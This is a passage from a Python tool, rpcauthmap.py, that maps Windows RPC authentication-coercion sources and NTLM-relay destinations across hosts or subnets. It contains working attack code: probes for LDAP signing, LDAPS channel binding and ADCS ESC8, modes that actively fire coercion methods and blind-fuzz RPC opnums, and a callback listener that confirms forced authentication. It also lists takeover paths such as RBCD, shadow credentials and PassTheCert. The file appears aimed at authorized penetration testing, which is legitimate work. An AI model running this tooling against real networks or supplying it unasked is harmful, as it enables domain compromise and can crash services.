                           'relays (coerce this host, relay ELSEWHERE instead)',
                           C.GREY))
        else:
            lines.append(c('     Relay target: none viable', C.GREY))
        if self.relay_checks:
            if ldap_viable:
                lines.append(c('     Cross-protocol: %s relay-viable here'
                               % ', '.join(ldap_viable), C.BRED))
                if coercibles:
                    lines.append(c('       Full chain: coerce this host, relay '
                                   'to %s for takeover' % ldap_viable[0], C.GREY))
            else:
                lines.append(c('     Cross-protocol: no LDAP/LDAPS/ADCS relay '
                               'path open here', C.GREY))

        # == LEVEL-2 FUZZ (UNVERIFIED CANDIDATES) ==
        fuzz_hits = []
        if self.do_fuzz:
            lines.append(c('  == LEVEL-2 FUZZ (UNVERIFIED) ==', C.BOLD + C.CYAN))
            if not self.fuzz_candidates:
                lines.append(c('     No candidate list available (built-in list '
                               'empty and no --candidates file).', C.GREY))
            elif not fuzz_results:
                lines.append(c('     No candidate interface from the file was found '
                               'remotely reachable on this host.', C.GREY))
            else:
                # order: CONFIRMED, LIKELY, accepted, then the quiet ones
                rank = {'CONFIRMED': 0, 'LIKELY': 1, 'would-fire': 2,
                        'accepted': 3, 'rejected': 4, 'skipped': 5,
                        'nobind': 6, 'capped': 7}
                shown_quiet = 0
                for fr in sorted(fuzz_results, key=lambda x: rank.get(x['verdict'], 9)):
                    v = fr['verdict']
                    lbl = fr.get('known') or fr['uuid']
                    tag = 'op%d' % fr['opnum'] if fr['opnum'] >= 0 else ''
                    if v == 'CONFIRMED':
                        fuzz_hits.append(fr)
                        lines.append('     %s  %s %s  %s'
                                     % (c('CONFIRMED', C.BOLD + C.GREEN),
                                        c(lbl, C.BBLUE), c(tag, C.GREY),
                                        c(fr['detail'], C.GREY)))
                    elif v == 'LIKELY':
                        fuzz_hits.append(fr)
                        lines.append('     %s  %s %s  %s'
                                     % (c('LIKELY', C.YELLOW), c(lbl, C.BBLUE),
                                        c(tag, C.GREY), c(fr['detail'], C.GREY)))
                    elif v == 'would-fire':
                        lines.append('     %s  %s %s  %s'
                                     % (c('would fire', C.CYAN), c(lbl, C.BBLUE),
                                        c(tag, C.GREY), c(fr['detail'], C.GREY)))
                    elif v == 'accepted':
                        lines.append('     %s  %s %s  %s'
                                     % (c('accepted', C.CYAN), c(lbl, C.BOLD),
                                        c(tag, C.GREY), c(fr['detail'], C.GREY)))
                    else:
                        # rejected / skipped / nobind / capped: summarized, quiet
                        if self.show_all:
                            lines.append(c('     %-9s %s %s  %s'
                                           % (v, lbl, tag, fr['detail']), C.GREY))
                        else:
                            shown_quiet += 1
                if shown_quiet and not self.show_all:
                    lines.append(c('     (%d more rejected/skipped/no-bind; '
                                   '--show-all to list)' % shown_quiet, C.GREY))
                if self.fuzz_dry_run:
                    lines.append(c('     [dry run] nothing was actually fired.',
                                   C.GREY))

        if self.show_all and detail_rows:
            lines.append(c('  == ALL INTERFACES (%d) ==' % len(detail_rows),
                           C.GREY))
            for blk in detail_rows:
                lines.extend(blk)

        result = {
            'host': host,
            'coercibles': coercibles,
            'rpc_relay': relay_viables,
            'smb_signing': smb_signing,
            'ldap': ls, 'ldaps': cb, 'esc8': esc8,
            'fuzz_hits': fuzz_hits,
        }
        return host, (relay_count + coerce_count, coerce_count, lines,
                      'scanned', result)


# --------------------------------------------------------------------------- #
# Cross-protocol relay-destination checks (LDAP signing, LDAPS channel binding,
# ADCS ESC8 web enrollment). These answer: if I coerce a machine account, where
# can I actually relay it?
#
# Technique (after zyn3rgy/LdapRelayScan): bind with BOGUS credentials and read
# the error. If the server rejects on the credentials (data 52e / invalid), the
# protection did NOT stop us, so relaying a real auth would work. If it rejects
# earlier with a signing/channel-binding error, the protection is enforced.
#
# NOTE: the exact error-code interpretation is the fiddly part and could not be
# validated here against a real DC. Verify on a live domain before trusting it.
# --------------------------------------------------------------------------- #
def _port_open(host, port, timeout):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def check_ldap_signing(host, timeout):
    """LDAP signing on 389. 'not required' == relay-viable."""
    if not _port_open(host, 389, timeout):
        return 'closed'
    if not _HAVE_LDAP3:
        return 'unknown (pip install ldap3)'
    try:
        server = Server(host, port=389, use_ssl=False, connect_timeout=timeout)
        conn = Connection(server, user='WORKGROUP\\nonexistent',
                          password='x', authentication=NTLM)
        conn.open()
        conn.bind()
        msg = '%s %s' % (conn.result.get('description', ''),
                         conn.result.get('message', ''))
        low = msg.lower()
        if '52e' in low or 'invalidcredentials' in low:
            return 'NOT required (relay-viable)'
        if 'strongerauth' in low or '8341' in low or '80090346' in low:
            return 'required'
        return 'unknown (%s)' % msg.strip()[:50]
    except Exception as e:
        return 'unknown (%r)' % e


def check_ldaps_channel_binding(host, timeout):
    """LDAPS channel binding (EPA) on 636. 'not required' == relay-viable."""
    if not _port_open(host, 636, timeout):
        return 'closed'
    if not _HAVE_LDAP3:
        return 'unknown (pip install ldap3)'
    try:
        tls = Tls(validate=ssl.CERT_NONE)
        server = Server(host, port=636, use_ssl=True, tls=tls,
                        connect_timeout=timeout)
        conn = Connection(server, user='WORKGROUP\\nonexistent',
                          password='x', authentication=NTLM)
        conn.open()
        conn.bind()
        msg = '%s %s' % (conn.result.get('description', ''),
                         conn.result.get('message', ''))
        low = msg.lower()
        if '80090346' in low:  # SEC_E_BAD_BINDINGS -> channel binding enforced
            return 'required'
        if '52e' in low or 'invalidcredentials' in low:
            return 'NOT required (relay-viable)'
        return 'unknown (%s)' % msg.strip()[:50]
    except Exception as e:
        return 'unknown (%r)' % e


def check_esc8(host, timeout):
    """Return web-enrollment URLs that answer with NTLM/Negotiate (ESC8)."""
    found = []
    probes = [('http', 80, '/certsrv/certfnsh.asp'),
              ('http', 80, '/certsrv/'),
              ('https', 443, '/certsrv/')]
    for scheme, port, path in probes:
        if not _port_open(host, port, timeout):
            continue
        try:
            if scheme == 'https':
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                                    context=ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=timeout)
            conn.request('GET', path)
            r = conn.getresponse()
            auth = (r.getheader('WWW-Authenticate') or '')
            conn.close()
            if r.status == 401 and ('NTLM' in auth or 'Negotiate' in auth):
                found.append('%s://%s%s' % (scheme, host, path))
        except Exception:
            continue
    return found


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _rand_tag():
    return 'x%d' % (int(time.time() * 1000) % 100000)


def _vis_pad(s, width):
    """Pad a (possibly colored) string to a visible width."""
    pad = width - len(strip_ansi(s))
    return s + (' ' * pad if pad > 0 else '')


def render_engagement_summary(results):
    """Final wrap-up: two side-by-side columns, coercible IPs on the left and
    relay destinations on the right."""
    left = []   # coercible-source cells
    right = []  # relay-destination cells
    grant = {'LDAP': 'RBCD/shadow-creds', 'LDAPS': 'RBCD/shadow-creds',
             'ADCS-ESC8': 'cert then PKINIT/PassTheCert',
             'SMB/RPC': 'privileged USER auth only'}

    for r in results:
        if r.get('coercibles'):
            labels = ', '.join(e['label'] for e in r['coercibles'])
            conf = any(e.get('confirmed') for e in r['coercibles'])
            verdict = (c('CONFIRMED', C.BOLD + C.GREEN) if conf
                       else c('candidate', C.YELLOW))
            left.append('%s  %s  %s' % (c(r['host'], C.BRED), verdict,
                                        c(labels, C.BBLUE)))
        # level-2 fuzz findings: enumerate only the CONFIRMED ones (a real
        # callback). LIKELY is unverified and can run to dozens of rows, so it is
        # collapsed to a single count line instead of being reprinted in full.
        fhits = r.get('fuzz_hits', [])
        for f in [x for x in fhits if x['verdict'] == 'CONFIRMED']:
            flabel = '%s op%d (fuzz)' % (f.get('known') or f['uuid'][:8],
                                         f['opnum'])
            left.append('%s  %s  %s' % (c(r['host'], C.BRED),
                                        c('CONFIRMED', C.BOLD + C.GREEN),
                                        c(flabel, C.BBLUE)))
        n_likely = sum(1 for x in fhits if x['verdict'] == 'LIKELY')
        if n_likely:
            left.append('%s  %s' % (c(r['host'], C.BRED),
                                    c('+%d fuzz LIKELY (unverified; see the '
                                      'per-host section)' % n_likely, C.YELLOW)))

        tags = []
        if r.get('ldap') and 'NOT required' in (r['ldap'] or ''):
            tags.append('LDAP')
        if r.get('ldaps') and 'NOT required' in (r['ldaps'] or ''):
            tags.append('LDAPS')
        if r.get('esc8'):
            tags.append('ADCS-ESC8')
        if r.get('rpc_relay'):
            tags.append('SMB/RPC')
        if tags:
            gtxt = '; '.join('%s=%s' % (t, grant[t]) for t in tags)
            right.append('%s  %s' % (c(r['host'], C.BRED),
                                     c(' '.join(tags), C.BOLD)
                                     + c('  (%s)' % gtxt, C.GREY)))

    if not left and not right:
        return ''

    # Column widths from visible lengths, with a padded gap and a separator.
    lhead = 'COERCIBLE IPs'
    rhead = 'RELAY DESTINATIONS'
    sep = '   |   '
    lwidth = max([len(strip_ansi(x)) for x in left] + [len(lhead)]) + 4
    rows = max(len(left), len(right))
    total = lwidth + len(sep) + max([len(strip_ansi(x)) for x in right]
                                    + [len(rhead)])

    out = []
    out.append('  %s' % c('=' * total, C.BOLD + C.CYAN))
    out.append('  %s' % c('SUMMARY', C.BOLD + C.CYAN))
    out.append('  %s' % c('=' * total, C.BOLD + C.CYAN))
    out.append('  %s%s%s' % (_vis_pad(c(lhead, C.BOLD), lwidth), c(sep, C.GREY),
                             c(rhead, C.BOLD)))
    out.append('  %s' % c('-' * total, C.GREY))
    for i in range(rows):
        lcell = left[i] if i < len(left) else ''
        rcell = right[i] if i < len(right) else ''
        out.append('  %s%s%s' % (_vis_pad(lcell, lwidth), c(sep, C.GREY), rcell))
    out.append('  %s' % c('=' * total, C.BOLD + C.CYAN))
    return '\n'.join(out)


def parse_creds(prefix):
    domain = ''
    username = prefix
    password = ''
    if '/' in prefix:
        domain, username = prefix.split('/', 1)
    if ':' in username:
        username, password = username.split(':', 1)
    return domain, username, password


def expand_targets(spec):
    targets = []
    if spec.startswith('@'):
        try:
            with open(spec[1:]) as fh:
                for ln in fh:
                    ln = ln.strip()
                    if ln and not ln.startswith('#'):
                        targets.append(ln)
        except Exception as e:
            sys.stderr.write('[-] Could not read target file: %s\n' % e)
        return targets
    for part in spec.split(','):
        part = part.strip()
        if not part:
            continue
        if '/' in part:
            try:
                net = ipaddress.ip_network(part, strict=False)
                targets.extend(str(ip) for ip in net.hosts())
                continue
            except ValueError:
                pass
        targets.append(part)
    return targets


def _default_src_ip():
    """Best-guess local IP the target would route back to (no traffic sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def main():
    global _NOCOLOR
    parser = argparse.ArgumentParser(
        add_help=True,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='rpcauthmap: map RPC coercion sources and NTLM-relay '
                    'destinations on a Windows host or subnet.',
        epilog='MODES (pick one; default is map):\n'
               '  map     discover + classify interfaces, show what can be a\n'
               '          coercion SOURCE and what can be a relay DESTINATION.\n'
               '          Read-only. This is the safe default.\n'
               '  coerce  everything in map, then actively fire the KNOWN\n'
               '          coercion methods and confirm via a callback.\n'
               '  hunt    everything in map, then blind-fire the built-in\n'
               '          candidate list to hunt for NEW coercion methods.\n'
               '          Loud and throttled; authorized targets only.\n\n'
               'EXAMPLES:\n'
               '  rpcauthmap.py map CORP/alice:pw@10.0.0.0/24\n'
               '  rpcauthmap.py coerce alice:pw@10.0.0.50\n'
               '  rpcauthmap.py hunt alice:pw@10.0.0.50 --dry-run\n\n'
               'The domain is optional: "alice:pw@host" works for a local or\n'
               'workgroup account. coerce/hunt auto-detect your callback IP\n'
               'and start their own listener, so no separate tool is needed.')
    parser.add_argument('target', nargs='?', metavar='[mode] target',
                        help='optional mode (map|coerce|hunt, default map) then '
                             'the target: [[domain/]user[:pass]@]'
                             '<host|CIDR|list|@file>. Domain optional.')
    parser.add_argument('-H', '-hashes', '--hashes', dest='hashes',
                        metavar='LM:NT', help='auth with NTLM hashes')
    parser.add_argument('--listener-ip', dest='listener_ip', metavar='IP',
                        help='callback IP for coerce/hunt (auto-detected if '
                             'omitted)')
    parser.add_argument('--dry-run', dest='dry_run', action='store_true',
                        help='coerce/hunt: show what WOULD fire, send nothing')
    parser.add_argument('-o', '--output', help='append plain-text results to file')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='also print dead/no-RPC hosts and debug errors')
    parser.add_argument('--show-all', action='store_true',
                        help='print every interface and every fuzz result')
    parser.add_argument('--no-color', action='store_true', help='disable colour')

    adv = parser.add_argument_group('advanced (sensible defaults; rarely needed)')
    adv.add_argument('-threads', '--threads', type=int, default=10,
                     help='concurrent hosts (default 10)')
    adv.add_argument('-timeout', '--timeout', type=int, default=3,
                     help='per-connect timeout seconds (default 3)')
    adv.add_argument('--listener-port', type=int, default=445,
                     help='callback listener port (default 445)')
    adv.add_argument('--callback-wait', dest='coerce_timeout', type=int, default=5,
                     help='seconds to wait for a callback (default 5)')
    adv.add_argument('--delay', dest='fuzz_delay', type=float, default=0.5,
                     help='hunt: base seconds between calls (default 0.5)')
    adv.add_argument('--jitter', dest='fuzz_jitter', type=float, default=0.5,
                     help='hunt: random extra 0..N seconds per call (default 0.5)')
    adv.add_argument('--max', dest='fuzz_max', type=int, default=200,
                     help='hunt: max calls per host (default 200)')
    adv.add_argument('--candidates', dest='fuzz_candidates', metavar='FILE',
                     help='hunt: use a specific candidate CSV for this run only')
    adv.add_argument('--rebuild', metavar='DUMP',
                     help='parse an NtObjectManager IDL dump (rpc_all.txt) into a '
                          '%s sidecar beside this script, then exit; hunt then '
                          'auto-loads it' % _SIDECAR_NAME)
    # Pull the optional mode token out of argv before argparse sees it, so it can
    # sit anywhere relative to the flags (argparse cannot reliably place an
    # optional positional that is separated from the target by a flag). What
    # remains is a single clean target positional.
    _VALUE_OPTS = {'-H', '-hashes', '--hashes', '--listener-ip', '-o', '--output',
                   '-threads', '--threads', '-timeout', '--timeout',
                   '--listener-port', '--callback-wait', '--delay', '--jitter',
                   '--max', '--candidates', '--rebuild'}
    _argv = list(sys.argv[1:])
    _mode = 'map'
    _skip = False
    for _i, _tok in enumerate(_argv):
        if _skip:
            _skip = False
            continue
        if _tok in _VALUE_OPTS:
            _skip = True
            continue
        if _tok.startswith('-'):
            continue
        # first positional token: it is the mode only if it is a mode word
        if _tok in ('map', 'coerce', 'hunt'):
            _mode = _tok
            _argv.pop(_i)
        break

    options = parser.parse_args(_argv)
    options.mode = _mode

    _NOCOLOR = options.no_color or not sys.stdout.isatty()

    # --rebuild is a standalone action: convert the dump, write the sidecar, exit.
    # No target or network needed.
    if options.rebuild:
        out = _sidecar_path()
        try:
            rows, remote_n, known_n = rebuild_candidates(options.rebuild, out)
        except Exception as e:
            sys.stderr.write('[-] rebuild failed reading %s: %s\n'
                             % (options.rebuild, e))
            sys.exit(1)
        print(c('[+] Rebuilt candidate list: %d method(s) (%d remote-reachable in '
                'the dump, %d on documented interfaces).'
                % (len(rows), remote_n, known_n), C.GREEN))
        print(c('[+] Wrote %s' % out, C.GREEN))
        print(c('[*] hunt now uses this sidecar automatically; delete it to fall '
                'back to the built-in list.', C.CYAN))
        sys.exit(0)

    if not options.target:
        parser.error('a target is required (unless using --rebuild). '
                     'Usage: rpcauthmap.py [map|coerce|hunt] <target>')

    # Derive the old per-feature switches from the chosen mode, so the rest of
    # the program is unchanged.
    options.coerce = (options.mode == 'coerce')
    options.fuzz = (options.mode == 'hunt')
    options.relay_checks = True            # read-only, port-gated; always useful
    options.brute = (options.mode == 'hunt')   # extra discovery depth when hunting
    options.fuzz_dry_run = options.dry_run
    options.no_pipes = False
    options.fuzz_all_transports = False

    # Hard ceiling on any single socket op so a half-open RPC port cannot hang
    # the sweep. The listener sets its own shorter timeout explicitly.
    socket.setdefaulttimeout(max(5, options.timeout + 2))

    # creds + target
    spec = options.target
    domain = username = password = ''
    if '@' in options.target:
        prefix, spec = options.target.rsplit('@', 1)
        domain, username, password = parse_creds(prefix)
    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass('Password:')

    # coerce/hunt need a callback IP; auto-detect it if the user did not give one.
    # A dry run fires nothing, so it needs no listener in either mode.
    needs_listener = (options.coerce or options.fuzz) and not options.fuzz_dry_run
    if needs_listener and not options.listener_ip:
        options.listener_ip = _default_src_ip()
        if not options.listener_ip:
            sys.stderr.write('[-] Could not auto-detect your callback IP; pass '
                             '--listener-ip.\n')
            sys.exit(1)
        print(c('[*] Callback IP auto-detected as %s (override with --listener-ip)'
                % options.listener_ip, C.CYAN))

    # Load the hunt candidate list. Precedence: an explicit --candidates file, then
    # a rebuilt sidecar sitting next to the script, then the built-in list.
    fuzz_candidates = {}
    if options.fuzz:
        cand_path = options.fuzz_candidates
        src = cand_path or 'built-in list'
        if not cand_path and os.path.exists(_sidecar_path()):
            cand_path = _sidecar_path()
            src = '%s (rebuilt)' % _SIDECAR_NAME
        try:
            fuzz_candidates = load_candidates(cand_path)
            print(c('[*] %d candidate interface(s), %d method(s) loaded (%s)'
                    % (len(fuzz_candidates),
                       sum(len(v) for v in fuzz_candidates.values()), src),
                    C.CYAN))
        except Exception as e:
            sys.stderr.write('[-] Could not read candidates file %s: %s\n'
                             % (cand_path, e))
            sys.exit(1)

    targets = expand_targets(spec)
    if not targets:
        sys.stderr.write('[-] No valid targets parsed.\n')
        sys.exit(1)

    listener = None
    if needs_listener:
        listener = CallbackListener('0.0.0.0', options.listener_port)
        try:
            listener.start()
        except Exception as e:
            sys.stderr.write('[-] Could not bind listener on port %d: %s\n'
                             '    (is smbd using 445? stop it or pick another '
                             'port the target can reach)\n'
                             % (options.listener_port, e))
            sys.exit(1)
        print(c('[*] Callback listener on 0.0.0.0:%d, expecting call-backs to %s'
                % (options.listener_port, options.listener_ip), C.CYAN))

    outfh = None
    if options.output:
        try:
            outfh = open(options.output, 'a')
            outfh.write('\n# rpcauthmap v2 sweep of %d target(s)\n' % len(targets))
        except Exception as e:
            sys.stderr.write('[-] Could not open output file: %s\n' % e)
            outfh = None

    if options.fuzz and not options.fuzz_dry_run:
        print(c('[!] LEVEL-2 FUZZ ARMED: blindly firing candidate opnums at '
                'discovered interfaces.', C.BRED))
        print(c('    This is loud and can hang or crash a service. Authorized, '
                'in-scope targets only.', C.YELLOW))
        print(c('    Pacing: %.1fs + up to %.1fs jitter per call, max %d/host.'
                % (options.fuzz_delay, options.fuzz_jitter, options.fuzz_max),
                C.GREY))
    _run_start = time.time()
    print(c('[*] Sweeping %d host(s) with %d thread(s)...'
            % (len(targets), options.threads), C.CYAN))
    print('')

    def worker(host):
        mapper = RPCAuthMap(
            username=username, password=password, domain=domain,
            hashes=options.hashes, timeout=options.timeout,
            show_all=options.show_all, probe_pipes=not options.no_pipes,
            do_brute=options.brute, do_coerce=options.coerce,
            listener=listener, listener_ip=options.listener_ip,
            coerce_timeout=options.coerce_timeout, debug=options.verbose,
            relay_checks=options.relay_checks,
            do_fuzz=options.fuzz, fuzz_candidates=fuzz_candidates,
            fuzz_delay=options.fuzz_delay, fuzz_jitter=options.fuzz_jitter,
            fuzz_max=options.fuzz_max, fuzz_dry_run=options.fuzz_dry_run,
            fuzz_remote_only=not options.fuzz_all_transports,
        )
        return mapper.scan(host)

    total_hits = total_coerce = hosts_scanned = hosts_quiet = 0
    results = []
    with ThreadPoolExecutor(max_workers=max(1, options.threads)) as pool:
        futures = [pool.submit(worker, h) for h in targets]
        for fut in as_completed(futures):
            host, payload = fut.result()
            hit_count, coerce_count, lines, status, result = payload
            results.append(result)
            if status == 'scanned':
                hosts_scanned += 1
                total_hits += hit_count
                total_coerce += coerce_count
            else:
                hosts_quiet += 1
            if status == 'scanned' or options.verbose:
                block = '\n'.join(lines)
                with _print_lock:
                    print(block)
                    print('')
                    if outfh:
                        outfh.write(strip_ansi(block) + '\n\n')
                        outfh.flush()

    if listener:
        listener.stop()

    fuzz_conf = sum(1 for r in results for f in r.get('fuzz_hits', [])
                    if f['verdict'] == 'CONFIRMED')
    fuzz_likely = sum(1 for r in results for f in r.get('fuzz_hits', [])
                      if f['verdict'] == 'LIKELY')
    s1 = ('[*] Sweep complete: %d target(s) probed; %d live RPC host(s), '
          '%d unreachable/no-RPC.' % (len(targets), hosts_scanned, hosts_quiet))
    s2 = ('[*] %d relay-viable/coercible endpoint(s); %d coercion(s) CONFIRMED '
          'via callback.' % (total_hits, total_coerce))
    print(c(s1, C.CYAN))
    print(c(s2, C.BOLD))
    if options.fuzz and not options.fuzz_dry_run:
        s3 = ('[*] Level-2 fuzz: %d new method(s) CONFIRMED, %d LIKELY '
              '(previously unverified candidates).' % (fuzz_conf, fuzz_likely))
        print(c(s3, C.BOLD + (C.GREEN if fuzz_conf else C.CYAN)))

    summary = render_engagement_summary(results)
    if summary:
        print('')
        print(summary)

    elapsed = time.time() - _run_start
    if elapsed >= 60:
        elapsed_txt = '%dm %.1fs' % (int(elapsed // 60), elapsed % 60)
    else:
        elapsed_txt = '%.1fs' % elapsed
    done = '[*] Run completed in %s' % elapsed_txt

    if outfh:
        outfh.write(strip_ansi(s1) + '\n' + strip_ansi(s2) + '\n')
        if summary:
            outfh.write('\n' + strip_ansi(summary) + '\n')
        outfh.write(done + '\n')
        outfh.close()
        print(c('[*] Plain-text results appended to %s' % options.output, C.CYAN))

    # very last line of the run
    print(c(done, C.CYAN))


if __name__ == '__main__':
    main()
